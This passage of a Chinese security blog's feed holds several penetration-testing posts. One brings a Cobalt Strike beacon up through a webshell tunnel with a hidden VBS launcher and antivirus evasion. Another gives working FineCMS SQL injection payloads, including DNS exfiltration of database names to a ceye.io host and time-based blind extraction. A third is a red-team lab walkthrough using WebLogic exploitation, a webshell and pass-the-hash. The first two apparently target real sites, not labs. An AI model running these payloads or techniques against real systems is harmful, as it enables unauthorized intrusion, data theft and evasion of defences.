src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213165205181.png" alt="image-20211213165205181"></p><p><strong>后续试试Windows环境反弹shell</strong></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一次内网不出网cs上线渗透操作过程</title>
    <link href="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
    <url>/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="记录一次内网不出网cs上线渗透"><a class="markdownIt-Anchor" href="#记录一次内网不出网cs上线渗透"></a> 记录一次内网不出网cs上线渗透</h1><h2 id="0x00"><a class="markdownIt-Anchor" href="#0x00"></a> 0x00</h2><p>因为遇到一个不出网的站并且拿到了shell，就想试试免杀上线cs。</p><h2 id="0x01-pystinger使用"><a class="markdownIt-Anchor" href="#0x01-pystinger使用"></a> 0x01 pystinger使用</h2><p>这次用的是<a href="https://github.com/FunnyWolf/pystinger">FunnyWolf/pystinger: Bypass firewall for traffic forwarding using webshell 一款使用webshell进行流量转发的出网工具 (github.com)</a> ，来实现的。</p><p><strong>1.首先在站点上传他们的服务端的webshell，访问后会显示以下情况。</strong></p><p><img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/image-20211129104341833.png" alt="image-20211129104341833"></p><p><strong>2.然后需要在目标机器上运行stinger_server.exe</strong></p><p>这里参考网上文章，先把stinger_server.exe上传到服务器，这里创建一个vbs文件，内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Set ws = CreateObject(&quot;Wscript.Shell&quot;)<br>ws.run &quot;cmd /c C:\xxx\xxx\stinger_server.exe 0.0.0.0&quot;,vbhide<br></code></pre></td></tr></table></figure><p>上传vbs文件后运行即可</p><img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/image-20211129110545112.png" alt="image-20211129110545112" style="zoom:80%;"><p>直接运行vbs文件即可，然后用tasklist查看一下进程是否有stinger_server.exe</p><p><strong>3.然后在vps上启动stinger_client，命令</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/stinger_client -w http:/</span><span class="hljs-regexp">/example.com:8080/</span>proxy.jsp(webshell路径) -l <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -p <span class="hljs-number">60000</span><br></code></pre></td></tr></table></figure><img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/image-20211129105046596.png" alt="image-20211129105046596" style="zoom:80%;"><h2 id="0x02-cs使用"><a class="markdownIt-Anchor" href="#0x02-cs使用"></a> 0x02 CS使用</h2><p>上面操作进行完之后，需要在cs中创建一个监听器，host填的是目标机器的内网ip地址</p><img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/image-20211129111155364.png" alt="image-20211129111155364" style="zoom:67%;"><p>对了，这台机器使用tasklist看到有360的进程，所以就顺便试了免杀，用的是<a href="https://github.com/1y0n/AV_Evasion_Tool">1y0n/AV_Evasion_Tool: 掩日 - 免杀执行器生成工具 (github.com)</a></p><img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/image-20211129110152221.png" alt="image-20211129110152221" style="zoom: 50%;"><p>然后cs导出c的payload，拖入生成exe。</p><p>上传后直接运行，cs里显示上线是127.0.0.1</p><img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/image-20211129164424229.png" alt="image-20211129164424229" style="zoom:67%;">]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>（CVE-2018-6893）Finecms-5-2-0-SQL注入漏洞（dns注入-时间盲注）记录</title>
    <link href="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="cve-2018-6893finecms-5-2-0-sql注入漏洞dns注入-时间盲注记录"><a class="markdownIt-Anchor" href="#cve-2018-6893finecms-5-2-0-sql注入漏洞dns注入-时间盲注记录"></a> （CVE-2018-6893）Finecms-5-2-0-SQL注入漏洞（dns注入-时间盲注）记录</h1><h1 id="0x00"><a class="markdownIt-Anchor" href="#0x00"></a> 0x00</h1><p>最近遇到个站用的是finecms，然后看漏洞库有一个SQL注入的漏洞，试了试符合漏洞库上说的特征，输入以下payload正常显示，如果更改内容可以导致报错。（2e746573747465737473742e636579652e696f5c5c616161）是unc路径的十六进制编码。</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://网站/index.php?s=member&amp;c=api&amp;m=checktitle&amp;id=<span class="hljs-number">13</span>&amp;title=<span class="hljs-number">123</span>&amp;module=news,(select load_file(concat(<span class="hljs-number">0</span>x<span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">5</span>c,version(),<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e<span class="hljs-number">746573747465737473742</span>e<span class="hljs-number">636579652</span>e<span class="hljs-number">696</span>f<span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">616161</span>))) as total<br></code></pre></td></tr></table></figure><p>​随便更改一下payload的内容可以导致报错并且泄露查询语句。</p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211127132218299.png" alt="image-20211127132218299" style="zoom:80%;"><p>​看了网上的方法都是使用dns注入得到结果的，然后我也去了解并且复现了了一下dns注入，因为确实还没使用过这种方法进行注入。</p><p>PS：随便一提，我这个站貌似用不了，可能是后台数据库不解析域名或者是设置不能用load_file。</p><h1 id="0x01-dns注入"><a class="markdownIt-Anchor" href="#0x01-dns注入"></a> 0x01 DNS注入</h1><p>​**条件：**1.得有SQL注入点。2.能使用load_file()函数（能使用的条件是mysql的secure_file_priv没有设置）3.目标启用域名解析。4.mysql得运行在Windows系统，因为linux系统没有UNC路径。</p><p>​<strong>原理：</strong></p><p><strong>1.load_file()函数用法</strong></p><p>select load_file(路径);      用于读取文件内容然后返回输出，这个路径可以是绝对的也可以是相对的，也可以是远程文件。</p><p><a href="http://xn--baidu-fg1hyjj1h827aca130ocx2gpibzy0he4gwr8a.com/aaa%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%AF%B7%E6%B1%82DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%9C%A8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A5%E5%BF%97%E4%B8%AD%E7%9C%8B%E5%88%B0%E3%80%82">例如访问一个网络路径如baidu.com/aaa，这样的，就会请求DNS服务器解析域名，就可以在DNS服务器日志中看到。</a></p><p>比如我们用以下语句查询：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;//&#x27;</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;域名//abc&#x27;</span>) <br></code></pre></td></tr></table></figure><p>就会请求DNS服务器解析域名，然后会留下一个数据库名字.域名的解析记录。</p><p><strong>2.UNC路径</strong></p><p>​就像如果你共享一个文件夹，这个文件夹的路径就会变成（\\服务器名\文件夹的路径）这样的形式。例如</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\\</span>DESKTOP-111<span class="hljs-symbol">\d</span>esktop<span class="hljs-symbol">\s</span>harename<br></code></pre></td></tr></table></figure><p>那么要获得一个dns域名可以使用http://ceye.io/提供的服务</p><p>注册拿到账号登录即可看到提供测试的域名。</p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211127173343892.png" alt="image-20211127173343892" style="zoom:80%;"><p>像我们访问//22333.域名//aaa这样的路径，就可以在dns解析日志里看到了。</p><p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211127175607489.png" alt="image-20211127175607489"></p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211127175756995.png" alt="image-20211127175756995" style="zoom:67%;"><p>​如果使用sql语句，一般payload为：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and if((<span class="hljs-name">select</span> load_file(<span class="hljs-name">concat</span>(&#x27;\\\\&#x27;,(<span class="hljs-name">select</span> database()),&#x27;.dns服务器域名\\aaa&#x27;))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>反斜杠用来转义\号，“\\\\”，就是2个反斜杠。</p><p><strong>验证测试：</strong></p><p>使用mysql命令执行</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id =<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((<span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;.xxxx.ceye.io\\aaa&#x27;</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128122551075.png" alt="image-20211128122551075"></p><p>然后就可以看到平台的结果了</p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128122044387.png" alt="image-20211128122044387" style="zoom:80%;"><h1 id="0x02-时间盲注实验"><a class="markdownIt-Anchor" href="#0x02-时间盲注实验"></a> 0x02 时间盲注实验</h1><p>​上面也说了，这个站不能进行DNS注入，那么只好试试时间盲注了。</p><p>把payload改成：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-meta">index</span>.php?s=member<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=checktitle<span class="hljs-variable">&amp;id</span>=13<span class="hljs-variable">&amp;title</span>=123<span class="hljs-variable">&amp;module</span>=news,(<span class="hljs-meta">select</span> sleep(4)) <span class="hljs-meta">as</span> total<br></code></pre></td></tr></table></figure><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128125422558.png" alt="image-20211128125422558" style="zoom:80%;"><p>发现有明显延迟，于是使用sqlmap指定注入点测试，能检测出注入点，但是不能爆出数据库。</p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128132254026.png" alt="image-20211128132254026" style="zoom:80%;"><p>于是用土方法试了试</p><p>payload：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-meta">index</span>.php?s=member<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=checktitle<span class="hljs-variable">&amp;id</span>=13<span class="hljs-variable">&amp;title</span>=123<span class="hljs-variable">&amp;module</span>=news,(<span class="hljs-meta">select</span> <span class="hljs-meta">if</span>(ascii<span class="hljs-meta">(substr(</span>database(),1,1))&gt;1,sleep(3),0)) <span class="hljs-meta">as</span> total<br></code></pre></td></tr></table></figure><p>回显数据库错误，爆出的语句把database()后的1改为了’sr_1’</p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128130630956.png" alt="image-20211128130630956" style="zoom:80%;"><p>然后发现我不管输入啥都是会改成sr_+输入（后面测试爆表的语句也会修改substr()函数的第二位参数）</p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128131019424.png" alt="image-20211128131019424" style="zoom:80%;"><p>突发奇想，试试加引号不知道会不会被替代，随后测试一个payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-meta">index</span>.php?s=member<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=checktitle<span class="hljs-variable">&amp;id</span>=13<span class="hljs-variable">&amp;title</span>=123<span class="hljs-variable">&amp;module</span>=news,(<span class="hljs-meta">select</span> <span class="hljs-meta">if</span>(ascii<span class="hljs-meta">(substr(</span>database(),<span class="hljs-string">&#x27;1&#x27;</span>,1))&gt;1,sleep(3),0)) <span class="hljs-meta">as</span> total<br></code></pre></td></tr></table></figure><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128132543143.png" alt="image-20211128132543143" style="zoom:80%;"><p>存在延时，验证通过，比较菜不知道这个能不能用sqlmap指定参数，直接自写脚本跑起就行，经过测试后面字段和表也可以这样爆，payload类似下面：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-meta">index</span>.php?s=member<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=checktitle<span class="hljs-variable">&amp;id</span>=13<span class="hljs-variable">&amp;title</span>=123<span class="hljs-variable">&amp;module</span>=news,(<span class="hljs-meta">select</span> <span class="hljs-meta">if</span>(ascii<span class="hljs-meta">(substr(</span>查询的sql语句,<span class="hljs-string">&#x27;1&#x27;</span>,1))=98,sleep(3),0)) <span class="hljs-meta">as</span> total<br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/image-20211128133349673.png" alt="image-20211128133349673"></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ATT&amp;CK红队评估二 内网靶场记录</title>
    <link href="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="attck红队评估二套靶场"><a class="markdownIt-Anchor" href="#attck红队评估二套靶场"></a> <strong>ATT&amp;CK红队评估二套靶场</strong></h1><h2 id="0x00-环境搭建"><a class="markdownIt-Anchor" href="#0x00-环境搭建"></a> 0x00 环境搭建</h2><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005203929704.png" alt="image-20211005203929704" style="zoom: 80%;"><p>​这里有个坑，就是WEB靶机密码是不对的，就离谱，我网上找了半天也没看到有人说这个问题，最后看到一个师傅的博客上说web靶机密码不对可以还原虚拟机快照，WEB靶机恢复到快照1.3即可</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005204330139.png" alt="image-20211005204330139" style="zoom:80%;"><p>靶机配置：</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006223721115.png" alt="image-20211006223721115" style="zoom:80%;"><h2 id="0x01-外网信息收集"><a class="markdownIt-Anchor" href="#0x01-外网信息收集"></a> 0x01 外网信息收集</h2><p><strong>注：我这搭建的的环境不太对劲，不管我怎么操作，WEB机器一直连不上域网络，而且登陆就会提示此工作站与域的信任关系失效，猜测应该和配置这个靶场的时间有关了，最后我只能先用本地administrator账号启动web服务</strong></p><p>​攻击机在192.168.111.128，先进行端口服务扫描</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005231017582.png" alt="image-20211005231017582" style="zoom:80%;"><p>看到7001开放weblogic服务，访问console目录发现有登陆页面</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005231157395.png" alt="image-20211005231157395" style="zoom:80%;"><p>GitHub上找了一个weblogic扫描工具进行扫描https://github.com/tangxiaofeng7/Weblogic-scan，存在cve-2019-2725漏洞</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005231627720.png" alt="image-20211005231627720" style="zoom:80%;"><h2 id="0x02-利用"><a class="markdownIt-Anchor" href="#0x02-利用"></a> 0x02 利用</h2><p>然后随便找了个利用工具上传冰蝎马</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005232541381.png" alt="image-20211005232541381" style="zoom:80%;"><p>使用工具连接</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/211005232733022.png" alt="image-20211005232733022" style="zoom: 67%;"><p>执行命令查看基本信息，可以看到机器有双网卡，有存在域de1ay下</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005233002342.png" alt="image-20211005233002342" style="zoom:80%;"><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005233104949.png" alt="image-20211005233104949" style="zoom:80%;"><p>使用cs上线</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005234435060.png" alt="image-20211005234435060" style="zoom:80%;"><p>冰蝎执行powershell上线</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006000431936.png" alt="image-20211006000431936" style="zoom:80%;"><p>这里执行太久没有反应，我就多弄了一下，然后就这样了，emmm</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006000528210.png" alt="image-20211006000528210" style="zoom:80%;"><p>beacon提权</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006001051755.png" alt="image-20211006001051755" style="zoom:80%;"><p>看到密码是1qaz@WSX</p><p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006001551621.png" alt="image-20211006001551621"></p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006002034050.png" alt="image-20211006002034050" style="zoom:80%;"><p>内外网端口探测，beacon命令portscan，我这环境和配置有点问题，其实我这台WEB机器不能连接上delay的域网络，登陆不了域内账号，我试了很多遍，最后只能先使用本地账号开启web服务，理论上这里可以看到10.10.10.201的pc机器。</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006214921960.png" alt="image-20211006214921960" style="zoom:80%;"><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006215008478.png" alt="image-20211006215008478" style="zoom:80%;"><p>由于以上原因，我先跳过横向移动过程，理论上面端口扫描是可以看得到域内10.10.10.201的win7的pc机的，这里直接手动上线这台机器进行下一步操作了，emmm。</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006215410344.png" alt="image-20211006215410344" style="zoom:80%;"><p>看域的名称</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006223346131.png" alt="image-20211006223346131" style="zoom:80%;"><p>再次扫描域网段10.10.10.0/24，发现10.10.10.10有可能就是域控</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image4036398.png" alt="image-20211006224036398" style="zoom:80%;"><h2 id="0x03-pth攻击"><a class="markdownIt-Anchor" href="#0x03-pth攻击"></a> 0x03 pth攻击</h2><p>先抓取这台机器上的账号密码，然后pth攻击</p><p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006225229969.png" alt="image-20211006225229969"></p><p>不过我这使用本机监听失败了，因为这个DC不出网，不过我看网上payload使用smb监听也失败了，emmm，可能真是我这个环境配的有问题，先到这，后面研究下，或者先换个靶场做</p><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006225536118.png" alt="image-20211006225536118" style="zoom:80%;"><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006225714893.png" 